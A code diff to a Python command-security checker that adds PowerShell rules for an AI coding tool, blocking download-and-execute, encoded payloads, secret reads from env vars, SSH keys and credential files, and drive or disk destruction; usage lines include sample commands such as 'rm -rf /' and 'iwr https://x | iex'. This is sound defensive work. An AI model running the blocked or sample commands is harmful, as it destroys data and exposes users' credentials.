@@ -9,6 +9,14 @@ Checks a command string for dangerous patterns and returns:
 Usage:
   echo "rm -rf /" | python bash_security.py
   python bash_security.py "rm -rf /"
+  echo "iwr https://x | iex" | python bash_security.py --shell powershell
+
+``--shell powershell`` (v0.2.102 W5-D): the command came from Claude Code's
+PowerShell tool (the only shell tool on Windows without Git Bash). The
+PowerShell rule set below runs FIRST — download-and-execute, encoded
+payloads, ``$env:`` secret reads, root/disk destruction in PowerShell
+spelling — and the Bash rule set after it (``rm -rf /home``, ``curl | sh``
+and friends mean the same thing when typed into PowerShell).
 """
 
 from __future__ import annotations
@@ -1042,12 +1050,134 @@ def _mask_vars(surface: str, names: "frozenset[str]") -> str:
     return masked
 
 
-def check_command(cmd: str, _depth: int = 0) -> tuple[bool, str]:
+# ═══════════════════════════════════════════════════════════════════════
+# PowerShell-tool rules (v0.2.102 W5-D)
+# ═══════════════════════════════════════════════════════════════════════
+#
+# The same threats as the Bash rules above, in PowerShell spelling. Every
+# pattern is case-insensitive (PowerShell is). Two surfaces: the env-read
+# rules scan the command with single-quoted literals blanked (PowerShell
+# never expands inside '...', so `'$env:GH_TOKEN'` is text, not a read);
+# every other rule scans the raw command (an `iex '...'` payload IS run).
+
+_PS_RULES: list[tuple[str, re.Pattern[str], str]] = []
+_SECRET_NAME = r"\w*(?:KEY|TOKEN|SECRET|PASS|CRED)\w*\b"
+_PS_FETCH = r"(?:iwr|irm|invoke-webrequest|invoke-restmethod|downloadstring|downloadfile|net\.webclient|start-bitstransfer)"
+_PS_EXEC = r"(?:iex|invoke-expression)"
+_PS_READ_VERB = r"(?:get-content|gc|cat|type|get-item|gi|get-childitem|gci|ls|dir)"
+
+
+def _ps_rule(name: str, pattern: str, explanation: str) -> None:
+    _PS_RULES.append((name, re.compile(pattern, re.IGNORECASE), explanation))
+
+
+_ps_rule(
+    "ps_download_exec",
+    rf"\b{_PS_FETCH}\b.*\b{_PS_EXEC}\b|\b{_PS_EXEC}\b.*\b{_PS_FETCH}\b",
+    "Network fetch executed as code (download-and-invoke)",
+)
+_ps_rule(
+    "ps_base64_exec",
+    rf"frombase64string.*\b{_PS_EXEC}\b|\b{_PS_EXEC}\b.*frombase64string",
+    "Base64-decoded content executed as code",
+)
+_ps_rule(
+    "ps_encoded_command",
+    r"\b(?:powershell|pwsh)(?:\.exe)?\b[^;|]*\s-(?:e|ec|en|enc|enco|encodedcommand)\s+['\"]?[A-Za-z0-9+/=]{16,}",
+    "Encoded PowerShell payload (cannot be inspected; run the plain command instead)",
+)
+_ps_rule(
+    "ps_env_secret_read",
+    rf"\$\{{?env:{_SECRET_NAME}(?!\s*=(?!=))"
+    rf"|getenvironmentvariable\(\s*['\"]{_SECRET_NAME}"
+    rf"|\b{_PS_READ_VERB}\s+[^;|]*\benv:[\\/]?[\w*]*(?:KEY|TOKEN|SECRET|PASS|CRED)",
+    "Reading a secret-shaped env var (use vct-secrets)",
+)
+_ps_rule(
+    "ps_env_grep_secrets",
+    rf"\b{_PS_READ_VERB}\s+[^;|]*\benv:.*\|.*(?:KEY|TOKEN|SECRET|PASS|CRED)",
+    "Searching the environment for secrets/credentials",
+)
+_ps_rule(
+    "ps_env_exfil",
+    rf"\benv:.*\|.*\b(?:{_PS_FETCH}|curl|wget)\b",
+    "Environment dump sent to a network tool",
+)
+_ps_rule(
+    "ps_read_ssh_keys",
+    r"\b(?:get-content|gc|cat|type)\s+[^;|]*\.ssh[\\/](?:id_|authorized_keys|known_hosts|config)",
+    "Reading SSH private keys or config",
+)
+_ps_rule(
+    "ps_read_env_files",
+    r"\b(?:get-content|gc|cat|type)\s+[^;|>]*\.(?:env|credentials|netrc|pgpass)\b",
+    "Reading credential files",
+)
+_ps_rule(
+    "ps_read_history",
+    r"consolehost_history|historysavepath",
+    "Reading shell history (may contain secrets)",
+)
+_ps_rule(
+    "ps_remove_root",
+    r"\b(?:remove-item|ri|rm|del|erase|rd|rmdir)\s+[^;|]*?"
+    r"(?:(?<![\w.\\/])[a-z]:[\\/]?\*?(?=[\s'\"]|$)"
+    r"|[a-z]:[\\/](?:windows|users|program files(?: \(x86\))?)[\\/]?\*?(?=[\s'\"]|$)"
+    r"|\$env:(?:userprofile|systemroot|windir|homedrive)[\\/]?\*?(?=[\s'\"]|$)"
+    r"|\$home[\\/]?\*?(?=[\s'\"]|$))",
+    "Destructive Remove-Item targeting a drive root, system or home directory",
+)
+_ps_rule(
+    "ps_format_disk",
+    r"\b(?:format-volume|clear-disk|initialize-disk|remove-partition)\b|\bformat(?:\.com)?\s+[a-z]:",
+    "Disk formatting/partitioning command",
+)
+
+_PS_ENV_READ_RULES: frozenset[str] = frozenset({
+    "ps_env_secret_read",
+    "ps_env_grep_secrets",
+    "ps_env_exfil",
+})
+_PS_CREDENTIAL_ACCESS_RULES: frozenset[str] = frozenset({
+    "ps_env_secret_read",
+    "ps_env_grep_secrets",
+    "ps_read_ssh_keys",
+    "ps_read_env_files",
+    "ps_read_history",
+})
+_PS_SINGLE_QUOTED = re.compile(r"'(?:[^']|'')*'")
+
+#: The shells ``check_command`` accepts (``--shell`` on the CLI).
+SHELLS: tuple[str, ...] = ("bash", "powershell")
+
+
+def check_powershell(cmd: str) -> tuple[bool, str]:
+    """The PowerShell rule set alone — ``(is_safe, reason)``."""
+    raw = " ".join(cmd.split())
+    env_surface = " ".join(_PS_SINGLE_QUOTED.sub("''", cmd).split())
+    for name, pattern, explanation in _PS_RULES:
+        surface = env_surface if name in _PS_ENV_READ_RULES else raw
+        if pattern.search(surface):
+            reason = f"[{name}] {explanation}"
+            if name in _PS_CREDENTIAL_ACCESS_RULES:
+                reason = f"{reason}\n{_REMEDIATION_HINT}"
+            return False, reason
+    return True, ""
+
+
+def check_command(cmd: str, _depth: int = 0, shell: str = "bash") -> tuple[bool, str]:
     """Check a command string for security violations.
+
+    ``shell="powershell"`` (v0.2.102 W5-D) runs :func:`check_powershell`
+    first, then the Bash rule set below.
 
     Returns:
         (is_safe, reason) -- reason is empty if safe.
     """
+    if shell == "powershell":
+        safe, reason = check_powershell(cmd)
+        if not safe:
+            return safe, reason
     # v0.2.88 (FP-heredoc): build two scan surfaces from the ORIGINAL command
     # (newlines intact so here-doc boundaries survive), then normalize
     # whitespace for the flat-regex rules. The env-read rules run on the
@@ -1125,16 +1255,22 @@ def check_command(cmd: str, _depth: int = 0) -> tuple[bool, str]:
 
 
 def main() -> int:
-    # Accept command from argument or stdin
-    if len(sys.argv) > 1:
-        cmd = " ".join(sys.argv[1:])
+    # Accept command from argument or stdin; `--shell powershell` (first
+    # arguments) selects the PowerShell rule set too.
+    args = sys.argv[1:]
+    shell = "bash"
+    if len(args) >= 2 and args[0] == "--shell" and args[1] in SHELLS:
+        shell = args[1]
+        args = args[2:]
+    if args:
+        cmd = " ".join(args)
     else:
         cmd = sys.stdin.read()
 
     if not cmd.strip():
         return 0
 
-    is_safe, reason = check_command(cmd)
+    is_safe, reason = check_command(cmd, shell=shell)
     if not is_safe:
         print(f"BLOCKED: {reason}", file=sys.stderr)
         print(f"Command: {cmd.strip()[:120]}", file=sys.stderr)
